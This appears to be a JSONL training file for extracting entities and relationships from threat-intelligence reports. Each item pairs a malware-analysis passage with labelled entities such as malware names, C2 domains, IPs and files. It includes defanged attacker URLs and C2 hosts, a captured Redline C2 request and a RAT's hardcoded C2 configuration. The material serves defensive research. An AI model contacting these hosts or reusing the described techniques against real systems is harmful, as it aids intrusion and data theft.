{"instruction": "Mirai Variant\nThe complete payload from Mirai is shown in Figure 2, it enters temp directory and downloads Mirai variant from http[:]//107[.]189[.]8[.]21/pedalcheta/cutie[.]x86_64, then executes with parameter \u201cVMware\u201d.\nLike most Mirai botnets, this variant\u2019s main jobs include deploying DoS and launching a brute force attack. We can decode part of the configuration after we XOR the data with 0x54 and get C2 server is \u201ccnc[.]goodpackets[.]cc\u201d. Following is the decoded strings:\nWe also identify the brute force function with encoded account and password strings:\nThe decoded passwords are listed below, they are commonly used passwords and also some default credentials for well-known IoT devices:\nAfter being executed, the variant shows hardcoded string \u201cInfectedNight did its job\u201d, and sends heartbeat along with parameter \u201cVMware\u201d, then it will wait for further commands from C2 server. Below is the traffic session from heartbeat and brute force attack.", "input": null, "output": "Named Entities: (Mirai Variant, malware), (http[:]//107[.]189[.]8[.]21/pedalcheta/cutie[.]x86_64, URL), (cnc[.]goodpackets[.]cc, Domain)\nRelationships: (Mirai Variant, download, http[:]//107[.]189[.]8[.]21/pedalcheta/cutie[.]x86_64), (Mirai Variant, C&C server, cnc[.]goodpackets[.]cc)"}
{"instruction": "FortiGuard Labs recently captured an Excel document with an embedded malicious file in the wild. The embedded file with a randomized file name exploits a particular vulnerability \u2014CVE-2017-11882\u2014to execute malicious code to deliver and execute malware on a victim\u2019s device. Part I of my analysis explained how this crafted Excel document exploits CVE-2017-11882 and what it does when exploiting that vulnerability. An involved website (hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/{file name}) was found storing and delivering numerous malware family samples, like Formbook and Redline. I dissected a recent Formbook sample from that website in part I of my analysis, including but not limited to how that Formbook was downloaded and deployed on a victim\u2019s device and what C2 servers it contains in that Formbook variant. Redline (also known as Redline Stealer) is a commercial malware family designed to collect sensitive information from infected devices, such as saved credentials, autocomplete data, credit card information, and more.", "input": null, "output": "Named Entities: (CVE-2017-11882, vulnerability), (malicious code, malware), (lutanedukasi[.]co[.]id, Domain), (Formbook, malware), (Redline, malware), (Redline Stealer, malware)\nRelationships: (malicious code, deliver, malware), (malware samples, include, Formbook), (malware samples, include, Redline), (Formbook, contains, C2 servers)"}
{"instruction": "Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collect Sensitive Information from Victim\u2019s Device. Severity level: Critical I start part II of my analysis by examining a Redline sample collected from that same website. In this report, you will learn how the Redline payload is extracted from the sample, how it maintains persistence on the infected device, what sorts of sensitive information are stolen from the victim\u2019s device, and how that stolen information is submitted to its C2 server. Redline Loader The Redline sample I selected is \u201chxxp[:]//lutanedukasi[.]co[.]id/wp-includes/almac.exe\u201d, which is a Redline loader. It is obfuscated by a .NET Obfuscator called SmartAssembly 6.9.0.114. When I analyzed this sample using a .Net debugger, I found that it has a comprehensive set of obfuscation features, such as obfuscated names (class names, function names, variable names, and more), control flow obfuscation, strings encoding, and declarative obfuscation.", "input": null, "output": "Named Entities: (Redline, malware), (Redline payload, tool), (lutanedukasi[.]co[.]id, Domain), (almac.exe, file), (SmartAssembly 6.9.0.114, tool), (C2 server, tool)\nRelationships: (Redline, submit to, C2 server)"}
{"instruction": "CheckConnect() checks to see if the connection status is OK. GetArguments() asks the C2 server which sensitive data it needs to steal from the victim\u2019s device. VerifyScanRequest() is responsible for submitting the stolen information to its C2 server. GetUpdates() updates the stolen information to the C2 server and asks for additional tasks from the C2 server. VerifyUpdate() is used to inform the C2 server that a task asked for by calling GetUpdates() has been completed. Let\u2019s check out a real instance of calling these methods. Imagine that Redline calls \u201cresult = this.serviceInterfacce.CheckConnect();\u201d. The request packet is shown below. Its body is sealed in SOAP: POST / HTTP/1.1 Content-Type: text/xml; charset=utf-8 SOAPAction: \"http://tempuri.org/Endpoint/CheckConnect\" Host: sinmac[.]duckdns[.]org:2667 Content-Length: 137 Expect: 100-continue Accept-Encoding: gzip, deflate Connection: Keep-Alive <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><CheckConnect xmlns=\"http://tempuri.org/\"/></s:Body></s:Envelope> This is the response packet: HTTP/1.1 200 OK Content-Length: 212 Content-Type: text/xml; charset=utf-8 Server: Microsoft-HTTPAPI/2.0 Date: Tue, 20 Sep 2022 18:45:28 GMT", "input": null, "output": "Named Entities: (Redline, attacker), (http://tempuri.org/Endpoint/CheckConnect, URL), (sinmac[.]duckdns[.]org:2667, Domain)\nRelationships: (http://tempuri.org/Endpoint/CheckConnect, domain, sinmac[.]duckdns[.]org:2667)"}
{"instruction": "It also creates a mutex with the string \u201cWindows\u201d, sets the environment variable \u201cSEE_MASK_NOZONECHECKS\u201d to 1, and checks if this mutex had been created before. If yes, it ends the process. After it collects the machine\u2019s information, it uses base64 to encode it and concatenates the data, as seen in Figure 29. It then transfers the data to server \u201cmobnew6565[.]duckdns[.]org\u201d using hardcoded TCP port 7575. Following is the C2 traffic from the Win10 victim machine. The separator changes to \u201c|-F-|\u201d and version is \u201cv4.0\u201d, but the format for the packet is similar to the old njRat version: <message length>.<command>|-F-|<data>", "input": null, "output": "Named Entities: (mobnew6565[.]duckdns[.]org, Domain), (njRat version, tool)\nRelationships: (C2 traffic, format, njRat version)"}
{"instruction": "The PowerShell command attempts to provide some environment information (e.g., machine name) and connect to a URL at gg1593[.]c1[.]biz. This domain points to IP address185[.]176[.]43[.]106. As of the time of this writing, however, the command and control (C2) server was not responding to connections, preventing further analysis.", "input": null, "output": "Named Entities: (PowerShell command, tool), (gg1593[.]c1[.]biz, Domain), (185[.]176[.]43[.]106, IP)\nRelationships: (PowerShell command, connect to, gg1593[.]c1[.]biz), (gg1593[.]c1[.]biz, points to, 185[.]176[.]43[.]106)"}
{"instruction": "After Cannondriver.exe loads the fake LBTServ.dll and calls the LGBT_Launch function, the malicious function loads the other dropped file, Microsoft.BT, into memory and proceeds to decrypt it. The attack chain is similar to that used by the Chinoxy backdoor, which also uses Cannondriver.exe to load a malicious LBTServ.dll to deliver its payload. However, this current variant sent to the telecommunication agency in South Asia delivers the final payload a bit differently than its predecessors. Instead of LBTServ.dll containing the final payload, it loads a shellcode from a separate file and injects itself into svchost.exe. It then contacts instructor[.]giize[.]com, a dynamic DNS redirecting the connection to the attacker\u2019s IP where the payload is hosted. Unfortunately, a remote file was not available at the time of this investigation. Luckily, a tweet by nao_sec identified PoisonIvy malware as the payload.", "input": null, "output": "Named Entities: (Cannondriver.exe, file), (LBTServ.dll, file), (Microsoft.BT, file), (Chinoxy backdoor, malware), (svchost.exe, file), (instructor[.]giize[.]com, Domain), (PoisonIvy malware, malware)\nRelationships: (Cannondriver.exe, load, LBTServ.dll), (LBTServ.dll, load, shellcode), (shellcode, inject, svchost.exe), (svchost.exe, contact, instructor[.]giize[.]com), (instructor[.]giize[.]com, redirect to, attacker's IP)"}
{"instruction": "The dropper malware covered earlier in this blog (SHA2: cdf417e67b0aaf798ac7c0f9ccb8b5b21f09b408ee6748beea5e03e76902e7fe) reaches out to goog1eupdate[.]com. Based on FortiGuard telemetry gathered over the past six months, almost 70% of the connections to the domain were made from Mexico, followed by 22% from India. Chinoxy variants also used this domain from 2016 to 2018. We also found three similar samples connect to frontbeauty[.]dynamic-dns[.]net, beautygirl[.]dynamic-dns[.]net, and 784kjsuj[.]dynamic-dns[.]net. Over the same past six months, all access to the three domains was made from India. As they are dynamic DNS, not all connections can be considered related to the threat actor. However, a Bitdefender report published in November 2020 references the domain \u201cgoog1eupdate[.]com\u201d as part of the", "input": null, "output": "Named Entities: (dropper malware, malware), (goog1eupdate[.]com, Domain), (frontbeauty[.]dynamic-dns[.]net, Domain), (beautygirl[.]dynamic-dns[.]net, Domain), (784kjsuj[.]dynamic-dns[.]net, Domain)\nRelationships: (dropper malware, reach out to, goog1eupdate[.]com)"}
{"instruction": "From the above instructions, we can identify this as Shikata Ga Nai (SGN) encoding. The SGN encoding schema is from the most popular exploit framework, Metasploit. It is a polymorphic XOR additive feedback encoder that allows malicious actors to evade detection. After decoding it, the main purpose of this shellcode is to start a reverse shell to the attacker\u2019s host \u00a0microsofto.duckdns[.]org with TCP port 55911 as shown in Figure 14.\nThe complete attack scenario from delivering a malicious document and exploiting CVE-2022-30190 (Follina) to deploying Rozena from the Discord CDN attachment space is shown in Figure 15.", "input": null, "output": "Named Entities: (Metasploit, tool), (microsofto.duckdns[.]org, Domain), (CVE-2022-30190, vulnerability), (Rozena, malware), (Discord CDN, tool)\nRelationships: (shellcode, purpose, start a reverse shell), (start a reverse shell, to, microsofto.duckdns[.]org)"}
{"instruction": "When MSDriverMonitor.exe executes, it drops a copy of itself as DllHelper.exe to %userprofile%\\AppVerif\\. During testing, it was found that this process appears to be polymorphic. Each time DllHelper is dropped, it has a different file size (usually quite large - around 800 MB) and therefore a different file hash, making it difficult to detect using that alone. The file appears to be identical to MSDriverMonitor.exe except for hundreds of megabytes of padding at the end of the file. It will also create a scheduled task named \u201cCOMSurrogate\u201d. The scheduled task executes DllHelper.exe every time a user logs onto the system. Also, at this stage, a ping to localhost (127.0.0.1) occurs. After a few moments, DllHelper will spawn and then inject the DCRat code into a legitimate Windows .NET process, InstallUtil.exe. At this point, DCRat will attempt to contact its C2 server which in this sample is \"star-cz[.]ddns[.]net\" at 103[.]27[.]202[.]127.", "input": null, "output": "Named Entities: (MSDriverMonitor.exe, file), (DllHelper.exe, file), (127.0.0.1, IP), (DCRat, malware), (InstallUtil.exe, file), (star-cz[.]ddns[.]net, Domain), (103[.]27[.]202[.]127, IP)\nRelationships: (MSDriverMonitor.exe, drop, DllHelper.exe), (DllHelper.exe, different file size, MSDriverMonitor.exe), (DCRat, contact, star-cz[.]ddns[.]net), (star-cz[.]ddns[.]net, IP, 103[.]27[.]202[.]127)"}
{"instruction": "However, it\u2019s essential for eager travelers to understand that malicious actors are just as eager to leverage that feeling of liberty to deliver malware. This blog will provide a few examples of such attacks that FortiGuard Labs recently discovered. Affected Platforms: Windows Impacted Parties: Windows users Impact: Controls victim\u2019s device and collects sensitive information Severity Level: Medium Adversaries Pushing Unsanitary Itineraries Itineraries are one of the must-haves for most travelers. Without one, they won\u2019t know when, how, and where to go, where to stay, and when and how to come home. An itinerary can also provide details on how much time travelers have at the destination so they can plan activities. AsyncRAT FortiGuard Labs recently discovered a malicious file called \u201citinerary.zip\u201d that was hosted on dc5b-163-123-142-137[.]ngrok[.]io.", "input": null, "output": "Named Entities: (malicious actors, attacker), (AsyncRAT, malware), (itinerary.zip, file), (dc5b-163-123-142-137[.]ngrok[.]io, Domain)\nRelationships: (malicious actors, deliver, malware), (AsyncRAT, hosted on, dc5b-163-123-142-137[.]ngrok[.]io)"}
{"instruction": "AsyncRAT provides remote access to attackers and allows them to remotely monitor and control a compromised machine through a secure encrypted connection. The RAT\u2019s features include keylogging, taking screenshots, and uploading and downloading files. This installed version of AsyncRAT connects to its C2 servers located at \u201cznets[.]ddns[.]net\u201d and \u201cdnets[.]ddns[.]net\u201d. In an attempt to further hinder analysis, this AsyncRAT variant uses multiple .NET obfuscators such as Xenocode, Babel, Yano, DotNetPatcher, CryptoObfuscator, Dotfuscator, SmartAssembly, Goliath, NineRays, and 198 Protector V2. Further investigation revealed that itinerary.zip was not the only file hosted on dc5b-163-123-142-137[.]ngrok[.]io. The files travel_details.iso, activities_and_dates.iso, and Itinerary.exe were also on the same domain and they also install AsyncRAT variants that connect to the same C2 servers.", "input": null, "output": "Named Entities: (AsyncRAT, malware), (C&C servers, tool), (znets[.]ddns[.]net, Domain), (dnets[.]ddns[.]net, Domain), (itinerary.zip, file), (dc5b-163-123-142-137[.]ngrok[.]io, Domain), (travel_details.iso, file), (activities_and_dates.iso, file), (Itinerary.exe, file)\nRelationships: (AsyncRAT, connect to, C&C servers), (itinerary.zip, hosted on, dc5b-163-123-142-137[.]ngrok[.]io), (travel_details.iso, hosted on, dc5b-163-123-142-137[.]ngrok[.]io), (activities_and_dates.iso, hosted on, dc5b-163-123-142-137[.]ngrok[.]io), (Itinerary.exe, hosted on, dc5b-163-123-142-137[.]ngrok[.]io)"}
{"instruction": "The installed Quasar RAT connects to the C2 server at opensea-user-reward[.]serveusers[.]com (DDNS). Fortinet\u2019s telemetry, as well as OSINT, did not observe any connections to the DDNS over the past three months. This could indicate that the attack was unsuccessful. Interestingly, FortiGuard Labs also discovered another Quasar RAT sample that shares the same resource section and the same C2 address. This sample was submitted from Hong Kong the day after the malware that was sent to a Colombian military service became public. While no evidence could be gathered to connect the samples to a single threat actor, given the similarities in the samples, it is possible that the same attacker targeted an organization in Hong Kong. Conclusion", "input": null, "output": "Named Entities: (Quasar RAT, malware), (opensea-user-reward[.]serveusers[.]com, Domain)\nRelationships: (Quasar RAT, connect to, C2 server), (C2 server, domain, opensea-user-reward[.]serveusers[.]com)"}
{"instruction": "Many further examples have been uploaded to VirusTotal that invoke Calc and other benign Windows tools as a method to test the vulnerability without causing damage. Active Exploitation The TA413 APT group, a hacking outfit linked to Chinese state interests, has adopted this vulnerability in attacks against the international Tibetan community. As observed on May 30 by security researchers, threat actors are now using CVE-2022-30190 exploits to execute malicious code via the MSDT protocol when targets open or preview Word documents delivered in ZIP archives. Campaigns have impersonated the 'Women Empowerments Desk' of the Central Tibetan Administration and use the domain tibet-gov.web[.]app. The security researchers also spotted DOCX documents with Chinese filenames being used to install malicious payloads detected as password-stealing Trojans via \"hxxp://coolrat[.]xyz\".", "input": null, "output": "Named Entities: (Calc, tool), (TA413 APT group, attacker), (Chinese state interests, attacker), (CVE-2022-30190, vulnerability), (tibet-gov.web[.]app, Domain), (coolrat[.]xyz, Domain)\nRelationships: (VirusTotal, upload, Calc)"}
{"instruction": "It not only contains the C2 server (\u201cmubbibun.duckdns.org\u201d) and port (0x3E7), but also a number of switch flags, such as whether to add itself into the auto-run group, bypass UAC (User Account Control), or bypass Windows Defender. Stage Two: Once Ave Maria establishes its connection to the C2 server it starts to control the victim\u2019s device. According to my research, the traffic between its client and the C2 server is RC4 encrypted with a constant encryption key \"warzone160\". I\u2019ll explain what the plaintext packet consists of through an instance packet as below. 29 BB 66 E4 70 EA 00 00 1E 00 00 00 00 00 00 00 00 FA 07 00 00 00 00 00 60 EA 00 00 4D 5A 90 00 \u2026 The first dword 0xE466BB29 is a magic value; each packet must start with this value.", "input": null, "output": "Named Entities: (Ave Maria, malware), (mubbibun.duckdns.org, Domain)\nRelationships: (Ave Maria, connect to, C2 server)"}
{"instruction": "Fileless Malware 2 \u2013 PandorahVNC RAT The second fileless malware injected into \u201cRegAsm.exe\u201d is \u201cPandorahVNC Rat,\u201d which is a commercial software. It was developed using C#, a Microsoft .Net framework. It supports features to steal credentials from some popular applications, like Chrome, Microsoft Edge, Firefox, Outlook, Foxmail, and so on. It also supports control commands to control the victim\u2019s device, such as starting a process, capturing the screenshot, manipulating the victim\u2019s mouse and keyboard, and more. Stage One: When it starts, it defines the following variables. They are the C2 server address, port, and the group id that will be used when sending data to the C2 server. string str = \"vncgoga.duckdns.org\"; //C2 server string str2 = \"1338\"; // TCP port string identifier = \"3H4RHL\"; // Group id", "input": null, "output": "Named Entities: (PandorahVNC RAT, malware), (RegAsm.exe, file), (Chrome, application), (Microsoft Edge, application), (Firefox, application), (Outlook, application), (Foxmail, application), (C2 server, tool), (vncgoga.duckdns.org, Domain), (TCP port, tool), (Group id, tool)\nRelationships: (PandorahVNC RAT, inject into, RegAsm.exe), (PandorahVNC RAT, steal credentials from, Chrome), (PandorahVNC RAT, steal credentials from, Microsoft Edge), (PandorahVNC RAT, steal credentials from, Firefox), (PandorahVNC RAT, steal credentials from, Outlook), (PandorahVNC RAT, steal credentials from, Foxmail), (PandorahVNC RAT, define, C2 server address), (PandorahVNC RAT, define, TCP port), (PandorahVNC RAT, define, Group id)"}
{"instruction": "Fileless Malware 3 \u2013 BitRAT The third fileless malware injected into \u201caspnet_compiler.exe\u201d is \u201cBitRat\u201d, which is said to be a high quality and efficient RAT. It provides information collection like clipboard logger, keylogger, application credentials, Webcam logging, and Voice Recording. It has wide control commands for controlling the victim\u2019s device, including downloading and executing a file, performing remote desktop control, controlling processes and services, reverse socks, and more. Stage One: BitRat has a configuration block encrypted similar to the Ave Maria Rat. Figure 3.1 shows the just decrypted configuration block in memory, where it contains C2 server (\u201cmaraipasoo[.]duckdns[.]org\u201d) & port (890), client ID (\u201cf2b8b66873ca913a\u201d), and more.", "input": null, "output": "Named Entities: (Fileless Malware 3, malware), (BitRAT, malware), (aspnet_compiler.exe, file), (C2 server, tool), (maraipasoo[.]duckdns[.]org, Domain)\nRelationships: (Fileless Malware 3, inject, aspnet_compiler.exe), (BitRAT, inject, aspnet_compiler.exe)"}
{"instruction": "The e-mail claims to come from a known oil company in Saudi Arabia (this information has been redacted along with the recipient\u2019s details). Even without reviewing the e-mail headers, it is apparent straight away that the origins of this message may not be as claimed. Note the \u201cFrom\u201d address is actually \u201cinfo@zoneofzenith[.]com\u201d, which has little resemblance to the domain of any petroleum-based business. The headers confirmed our initial suspicions about the origins of this e-mail and show that it was indeed sent from the \u201czoneofzenith[.]com\u201d domain.", "input": null, "output": "Named Entities: (zoneofzenith[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "It then runs schtasks to create a schedule task named \u201ccalendersw\u201d in the system \u201cTask Scheduler\u201c. It performs the command \u201cC:\\ProgramData\\ddond.com hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file\u201d every 82 minutes, which looks like parsing \u201cAPRL27.html\u201d. It is also a persistence mechanism. Once it starts, back.htm adds more scheduled tasks. It also runs taskkill to kill processes, if existing, of MS Word (WinWord.exe), MS Excel (Excel.exe), and MS Pointpoint (POWERPNT.exe). Figure 3.2 is the screenshot of an HTTP proxy program showing the packets from \u201cAPRL27.htm\u201d to \u201cmainpw.dll\u201d marked in the red box. The green box (back.htm) and blue box (Start.htm) are other groups of requests from other \u201cddond.com\u201d commands started by the Task Scheduler. The \u201cmainpw.dll\u201d file (size 7.58MB) is full of PowerShell code that can be split into three parts for three fileless malware. Figure 3.3 is a display of the simplified structure of \u201cmainpw.dll\u201d.", "input": null, "output": "Named Entities: (Task Scheduler, tool), (C:\\ProgramData\\ddond.com, file), (hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file, URL), (APRL27.html, file), (WinWord.exe, file), (Excel.exe, file), (POWERPNT.exe, file), (HTTP proxy program, tool), (APRL27.htm, file), (mainpw.dll, file), (ddond.com, Domain)\nRelationships: (APRL27.htm, command, ddond.com), (mainpw.dll, split into, three parts for three fileless malware)"}
{"instruction": "These delays are executed by calling the Sleep() function. In .NET, Sleep() accepts values in milliseconds. In certain cases, for example, from DelayMinAlive to DelayMaxAlive, the malware can sleep anywhere from 6 to 8 hours! While this malware sleeps in certain program states, other program states require it to contact the C2 server. Like the Excel macro, it contacts seemingly random subdomains. However, in actuality, it uses a domain generation algorithm (DGA) to calculate a subdomain. The malware constructs the DGA by first randomly assigning a value to _AgentID. This value is then fed as a seed into the RandomMersenneTwister function, highlighted above. It then performs further calculations using the haruto string as well as the strings found in the CharsDomain and CharsCounter variables. Once a subdomain string is generated, the malware randomly chooses one of three domains to concatenate with (joexpediagroup[.]com, asiaworldremit[.]com, or uber-asia[.]com).", "input": null, "output": "Named Entities: (C2 server, tool), (Excel macro, tool), (joexpediagroup[.]com, Domain), (asiaworldremit[.]com, Domain), (uber-asia[.]com, Domain)\nRelationships: (malware, contact, C2 server)"}
{"instruction": "A mutex (mutual exclusion object) is a program object that is created so multiple program threads can take turns sharing the same resource. In its most basic definition, it is simply a locking mechanism. If a mutex with a value of 726a06ad-475b-4bc6-8466-f08960595f1e already exists on the system, it means there is already a previous instance of the malware running on the infected computer. As a result, if a scheduled task starts another copy of the malware, the malware detects the mutex, and it is terminated immediately. C2 Servers This malware has the ability to contact three domains (joexpediagroup[.]com, asiaworldremit[.]com, uber-asia[.]com). Similarly, the Excel macro is able to contact the joexpediagroup[.]com domain. Uber-asia[.]com", "input": null, "output": "Named Entities: (malware, malware), (C2 Servers, tool), (joexpediagroup[.]com, Domain), (asiaworldremit[.]com, Domain), (uber-asia[.]com, Domain), (Excel macro, tool)\nRelationships: (malware, contact, C2 Servers), (Excel macro, contact, joexpediagroup[.]com)"}
{"instruction": "This domain, which may be imitating Uber rideshare for Asia, was registered slightly more than two months ago, on February 27, 2022. According to passive DNS records, this domain resolves to 127[.]0[.]0[.]1. Interestingly enough, VirusTotal was able to record a DNS entry. This certainly fits the format used by the malware. The subdomain appears to be a DGA. The first octet of the IP address is greater than 128, and the remaining octets define the size of the command to be executed. Unfortunately, the rest of the DNS data is not available. This suggests that the malware operators are closely monitoring this C2 server and only activate it when necessary. Joexpediagroup[.]com", "input": null, "output": "Named Entities: (127[.]0[.]0[.]1, IP), (VirusTotal, tool), (Joexpediagroup[.]com, Domain)\nRelationships: (Joexpediagroup[.]com, resolves to, 127[.]0[.]0[.]1), (Joexpediagroup[.]com, recorded by, VirusTotal)"}
{"instruction": "This domain, which may be imitating Expedia travel for Jordan, was created earlier this year, on January 20, 2022. Sometime after April 20, 2022, this domain also started resolving to 127[.]0[.]0[.]1, most likely for the same reason as above. Prior to that, however, the domain resolved to 45[.]11[.]19[.]47. The server also had SSH port 22 open. Our own Fortinet telemetry detected someone connecting to this IP address from the country of Jordan. Asiaworldremit[.]com", "input": null, "output": "Named Entities: (127[.]0[.]0[.]1, IP), (45[.]11[.]19[.]47, IP), (Asiaworldremit[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "Additional evidence indicates affiliation to Winnti. The rootkits are digitally signed with certificates stolen from game development companies, which is a known characteristic of Winnti. Searching for more files signed with one of the certificates led to a malicious DLL uploaded to VirusTotal with the name winmm.dll. Further examination revealed it as the same tool referenced in a blog about Winnti that was published in 2013. Yet another connection to Winnti is based on a C2 domain. Two of the newdev.dll loaders are configured with the server gnisoft[.]com, which was attributed to Winnti in 2020. Conclusion", "input": null, "output": "Named Entities: (Winnti, attacker), (rootkits, malware), (certificates, tool), (winmm.dll, file), (gnisoft[.]com, Domain)\nRelationships: (rootkits, signed with, certificates), (gnisoft[.]com, attributed to, Winnti)"}
{"instruction": "While the email does not contain a malicious attachment or link, the scammer is asking for a response. This is likely to contain a follow up message for further information. Perhaps the threat actor may engage in dialog with the victim and will ask the victim to send payment via wire transfer, third-party payment processors (such as Venmo, Zelle, etc.), or via cryptocurrency. The email address of the sender uses a gmail.com email address to likely evade spam filters. Bitcoin Variation", "input": null, "output": "Named Entities: (scammer, attacker), (gmail.com, Domain), (third-party payment processors, threat type), (Venmo, tool), (Zelle, tool), (cryptocurrency, threat type), (Bitcoin Variation, malware)\nRelationships: (third-party payment processors, include, Venmo), (third-party payment processors, include, Zelle), (scammer, use, Bitcoin Variation)"}
{"instruction": "The screenshot below highlights a brazenly opportunistic scam with the subject line \u201cURGENT DONATION RESPONSE FOR WAR REFUGEE CAMP IN UKRAINE.\u201d It purports to originate from a trusted organization, The United Nations. Red flags are the forged email address of the UN High Commissioner \u201cinfo@seca[.]cam\u201d in the \u201cFrom\u201d line, as well as some grammatical and punctuation errors. Another red flag is that the seca[.]cam domain was only registered a few weeks ago, on February 23, 2022.", "input": null, "output": "Named Entities: (The United Nations, attacker), (seca[.]cam, Domain)\nRelationships: No related relations."}
{"instruction": "All relevant URIs to campaigns mentioned in the blog are blocked by the FortiGuard Web Filtering service. The malicious Excel sample and associated downloaded files are detected as: \u201cXML/Dloader.802!tr, \u201cW32/Emotet.C!tr\", \u201cW32/Emotet.CV!tr\u201d, and \u201cW32/Emotet.1150!tr\u201d are blocked by the FortiGuard AntiVirus service. The IRS phishing email targeting nonresident aliens is detected as: IRS PDF/Fraud.10F1!phish Ukraine Related Scams URGENT RESPONSE REQUIRED! (UKRAINE) campaign ecres231[.]servconfig[.]com Is classified as a spam server and is blocked by our Web Filtering client. URGENT DONATION RESPONSE FOR WAR REFUGEE CAMP IN UKRAINE campaign seca[.]cam is classified as a spam sender and is blocked by the Web Filtering client. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: The FortiPhish Phishing Simulation Service uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks.", "input": null, "output": "Named Entities: (XML/Dloader.802!tr, malware), (W32/Emotet.C!tr, malware), (W32/Emotet.CV!tr, malware), (W32/Emotet.1150!tr, malware), (IRS PDF/Fraud.10F1!phish, threat type), (ecres231[.]servconfig[.]com, Domain), (seca[.]cam, Domain), (Fortinet, tool), (FortiPhish Phishing Simulation Service, tool)\nRelationships: No related relations."}
{"instruction": "By August 2003, many individuals and organizations were connected to the internet using a broadband connection. This gave rise to record-breaking worm and wormlike attacks. On August 11, 2003, Blaster (also known as MSBlast and lovesan) was launched. Home users and workers at large organizations were shocked when their machines suddenly experienced the dreaded \u201cBlue Screen of Death\u201d (BSOD) and rebooted. What they didn\u2019t know was that they had been disrupted by the Blaster worm. Blaster targeted a remote procedure call (RPC) vulnerability in Microsoft Windows XP and 2003 operating systems to propagate worldwide. The worm's goal was to perform a SYN flood attack against windowsupdate.com to prevent machines from accessing updates. Luckily for Microsoft, the author made the mistake of directing Blaster to the wrong domain. The windowsupdate.com domain was nonessential as machines instead used windowsupdate.microsoft.com to receive their updates.", "input": null, "output": "Named Entities: (Blaster, malware), (MSBlast, malware), (lovesan, malware), (windowsupdate.com, Domain), (windowsupdate.microsoft.com, Domain)\nRelationships: (Blaster, perform, SYN flood attack), (Blaster, direct to, windowsupdate.com), (windowsupdate.com, nonessential, windowsupdate.microsoft.com)"}
{"instruction": "The threat actor would then attempt to convince the victim to provide remote access to their device for \u201cremediation,\u201d after which they would take control of the victim\u2019s machine to perform further malicious acts while charging exorbitant fees for nonexistent services. 2016: The first IoT botnet arrives The arrival of Mirai surprised many. It was the first botnet to target IoT devices. While it primarily targeted network routers, it included other IoT devices. Mirai was mainly a DDoS botnet. and was involved in notable attacks against Brian Krebs\u2019s website, krebsonsecurity.com. as well as being responsible for taking down a massive segment of the internet, disrupting access and services worldwide", "input": null, "output": "Named Entities: (threat actor, attacker), (Mirai, malware), (IoT botnet, threat type), (DDoS botnet, threat type), (krebsonsecurity.com, Domain)\nRelationships: (Mirai, involved in, attacks against Brian Krebs\u2019s website)"}
{"instruction": "The e-mail originated at an address of 194[.]99[.]46[.]38 that corresponds to slot0.warongsoto.com. This is hosted on a run-of-the-mill VPS server. Visiting the server, we noticed that the site states that the server control panel is controlled by VESTA. Recent CVE data highlights that Vesta Control Panel is affected by remote command execution and elevation of privilege vulnerabilities that ultimately allow for full compromise of the system (CVE-2020-10786 and CVE-2020-10787). The domain itself appears to be either abandoned or at least unused with no active content hosted. It was registered in the United States in October 2021. The originating e-mail address does not appear to reference an actual individual and a search for other instances of this being used elsewhere came up empty. Examining the dropper \u2013 stage 1 Phase 1", "input": null, "output": "Named Entities: (194[.]99[.]46[.]38, IP), (slot0.warongsoto.com, Domain), (VESTA, tool), (CVE-2020-10786, vulnerability), (CVE-2020-10787, vulnerability)\nRelationships: (194[.]99[.]46[.]38, corresponds to, slot0.warongsoto.com), (VESTA, affected by, CVE-2020-10786), (VESTA, affected by, CVE-2020-10787)"}
{"instruction": "The domain warongsoto.com is blocked by the Web Filtering client.", "input": null, "output": "Named Entities: (warongsoto.com, Domain)\nRelationships: No related relations."}
{"instruction": "Messages to the C2 server, including requests for commands, have a fixed structure. Every request to the server is composed of hardcoded HTTP headers impersonating legitimate network traffic to taboola[.]com. The structure of the HTTP body sent to the server is depicted below. CompressedBuffer is zlib-deflated data. Receipt of commands begins when the backdoor sends information about the machine to the server with a MessageType of 0x11000000: Hostname IP address(es) CPU architecture RAM size The server response structure is similar to that of the request: In a separate thread, the backdoor may signal the server if command receipt suppression is currently in effect with MessageType 0x1100000B. Commands", "input": null, "output": "Named Entities: (C2 server, tool), (taboola[.]com, Domain)\nRelationships: (C2 server, impersonate, taboola[.]com)"}
{"instruction": "The constant headers of the request have been changed to impersonate traffic to s-microsoft[.]com, and the GetSubInfo export collects the machine information. Commands The message structures are the same as those of the original backdoor. As seen in the table below, several new command codes were not present in the original backdoor. When one of the five named commands is received, the backdoor downloads and executes a DLL from the server. The command names are disclosed in the binary and are passed to the command DLLs as part of their arguments. Because the DLLs themselves are unknown to us, we can only speculate on their functionality based on their names and the implementations of the same command types in the original backdoor code.", "input": null, "output": "Named Entities: (s-microsoft[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "According to our sources, this server is not a shared server and the IP address only contains the sinitude[.]com domain. JARM Fingerprinting For those unfamiliar with JARM, it is a technology developed by Salesforce to fingerprint servers for the purposes of clustering. Specifically, JARM revolves around a server\u2019s TLS implementation. As further explained by Salesforce, it is not a secure crypto function, and as a result, it may produce false positives. Nevertheless, it has been a fairly accurate way to group malicious servers into relevant clusters.", "input": null, "output": "Named Entities: (sinitude[.]com, Domain), (JARM, tool), (Salesforce, tool)\nRelationships: (JARM, developed by, Salesforce)"}
{"instruction": "The JARM signature for sinitude[.]com has been found on numerous servers. Many of these servers have also acted as Cobalt Strike beacon C2 servers. During the course of our investigation, we found that this JARM signature was also found on C2 servers associated with the malware family BazarLoader. BazarLoader, among other things, contains code and application guardrails that makes sure it is not running on a Russian computer. By looking at network traffic since the beginning of this year, we found that several IP addresses are connected to sinitude[.]com. However, our data indicates that only one IP address (back in January) actually created a full connection to communicate with the C2. This IP address is located in Kharkiv, the second largest city in Ukraine. This Kharkiv IP address itself has communicated with unique malware families and is part of the TOR network. Conclusion", "input": null, "output": "Named Entities: (sinitude[.]com, Domain), (Cobalt Strike, tool), (BazarLoader, malware)\nRelationships: (C2 servers, associated with, BazarLoader)"}
